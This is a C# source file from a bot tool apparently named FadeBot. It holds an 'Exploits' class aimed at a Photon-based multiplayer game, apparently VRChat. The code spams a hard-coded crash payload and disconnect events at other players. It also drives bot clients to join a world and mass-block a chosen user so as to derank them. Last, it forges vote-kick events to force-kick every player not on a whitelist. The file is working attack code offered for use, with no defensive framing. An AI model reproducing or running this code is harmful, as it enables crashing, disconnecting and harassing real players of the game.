using ExitGames.Client.Photon;
using FadeBot.Functions;
using Photon.Realtime;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace FadeBot
{
    internal class Exploits
    {
        private static readonly byte[] CrashEvent6 = new byte[] { 106, 159, 142, 10, 204, 1, 0, 0, 0, 36, 0, 58, 49, 56, 54, 65, 49, 47, 85, 115, 101, 114, 67, 97, 109, 101, 114, 97, 73, 110, 100, 105, 99, 97, 116, 111, 114, 47, 73, 110, 100, 105, 99, 97, 116, 111, 114, 14, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 10, 0, 84, 105, 109, 101, 114, 66, 108, 111, 111, 112, 0, 0, 0, 0, 4, 0, 0, 10 };

        public static void Event6Exploit()
        {
            2000.EventSpammer(20, () =>
            {
                foreach (PhotonClient pc in Load.photonClients)
                {
                    if (pc.InRoom) pc.OpRaiseEvent(6, CrashEvent6, new RaiseEventOptions { Receivers = ReceiverGroup.Others, CachingOption = EventCaching.DoNotCache, }, default);
                }
            });
            Logger.Log("Event 6 Done");
        }

        public static void Event210DC()
        {
            2000.EventSpammer(15, () =>
            {
                foreach (PhotonClient pc in Load.photonClients)
                {
                    if (pc.InRoom)
                    {
                        pc.OpRaiseEvent(210, new int[] { 0, 0 }, new RaiseEventOptions() { Receivers = ReceiverGroup.Others }, default);
                        pc.OpRaiseEvent(209, new int[] { 0, 0 }, new RaiseEventOptions() { Receivers = ReceiverGroup.Others }, default);
                    }
                }
            });
            Logger.Log("Event 210 Done");
        }

        public static void ReloadAvatar(PhotonClient pc)
        {
            if (pc.InRoom)
            {
                pc.OpRaiseEvent(40, (short)1, new RaiseEventOptions() { Receivers = ReceiverGroup.Others }, default);
            }
        }

        public static void SendEvent8(PhotonClient pc)
        {
            List<byte> Actors = new List<byte>();
            foreach (var Player in pc.CurrentRoom.Players.Values)
            {
                if (Player.ActorNumber != pc.LocalPlayer.ActorNumber) Actors.Add((byte)Player.ActorNumber);
            }
            if (pc.InRoom) pc.OpRaiseEvent(8, Actors.ToArray(), new RaiseEventOptions() { Receivers = ReceiverGroup.Others }, default);
        }

        public static void Derank(string userid, string WorldID)
        {
            foreach (PhotonClient pc in Load.photonClients)
            {
                PhotonClient.ShouldInstantiate = true;
                PhotonClient.InstantiateSilent = false;
                string region = "usw";
                if (WorldID.Contains("~region(jp)")) region = "jp";
                else if (WorldID.Contains("~region(eu)")) region = "eu";
                if (WorldID.Contains("wrld_") && pc.CloudRegion.Contains(region)) pc.JoinRoom(WorldID);
                Thread.Sleep(6000);
                Moderate(userid, true);
                Thread.Sleep(6000);
                pc.LeaveRoom();
            }
        }

        public static void Moderate(string userid, bool Block)
        {
            foreach (PhotonClient pc in Load.photonClients)
            {
                if (pc.InRoom)
                {
                    if (Block) HttpUtils.HttpModerate("block", pc.GetToken(), userid);
                    else HttpUtils.HttpUnmoderate("block", pc.GetToken(), userid);

                    pc.OpRaiseEvent(33, new Dictionary<byte, object>
                    {
                        { 0, (byte)22 },
                        { 1, userid },
                        { 3, Block },
                    }, new RaiseEventOptions()
                    {
                        CachingOption = EventCaching.DoNotCache,
                        Receivers = ReceiverGroup.Others,
                        TargetActors = null,
                    }, new SendOptions()
                    {
                        DeliveryMode = DeliveryMode.Reliable,
                        Reliability = true,
                        Encrypt = false,
                        Channel = 0,
                    });
                }
            }
        }

        public static string ForcekickID = "";

        public static void ForceKick(string ID)
        {
            VoteKick(ID);
            Thread.Sleep(1000);
            AcceptKick(ForcekickID);
            Logger.Log($"Force kicked: {ID}");
        }

        public static List<string> WhiteList = new List<string>
        {
            "usr_2e46c021-6211-43ad-8890-c5a253a7877b",
        };

        public static void ForceKickAll()
        {
            var output = Load.photonClients.Find(pc => pc.InRoom).CurrentRoom.Players.Values.Where(p => !Load.photonClients.Any(bot => bot.LocalPlayer.GetAPIUserID() == p.GetAPIUserID())).Where(p => !WhiteList.Contains(p.GetAPIUserID()));

            Console.WriteLine("Force kicking " + output.Count().ToString() + " people");

            try
            {
                foreach (Player player in output)
                {
                    ForceKick(player.GetAPIUserID());
                    Thread.Sleep(300);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Failed... " + e.Message + " Retrying...");
                ForceKickAll();
            }
        }

        public static void VoteKick(string ID)
        {
            Load.photonClients.Find(pc => pc.InRoom).OpRaiseEvent(33, new Dictionary<byte, object>
            {
                { 0, (byte)5 },
                { 1, ID },
            }, new RaiseEventOptions()
            {
                CachingOption = EventCaching.DoNotCache,
                Receivers = ReceiverGroup.Others,
                TargetActors = null,
            }, new SendOptions()
            {
                DeliveryMode = DeliveryMode.Reliable,
                Reliability = true,
                Channel = 0,
            });
        }

        public static void AcceptKick(string KickID)
        {
            foreach (PhotonClient pc in Load.photonClients)
            {
                pc.OpRaiseEvent(33, new Dictionary<byte, object>
                {
                    { 0, (byte)13 },
                    { 3, KickID },
                }, new RaiseEventOptions()
                {
                    CachingOption = EventCaching.DoNotCache,
                    Receivers = ReceiverGroup.Others,
                    TargetActors = null,
                }, new SendOptions()
                {
                    DeliveryMode = DeliveryMode.Reliable,
                    Reliability = true,
                    Encrypt = false,
                    Channel = 0,
                });
            }
        }

        private static RaiseEventOptions SetPlayerAsTarget(Player ply)
        {
            return new RaiseEventOptions
            {
                TargetActors = new int[] { ply.ActorNumber }
            };
        }
    }
}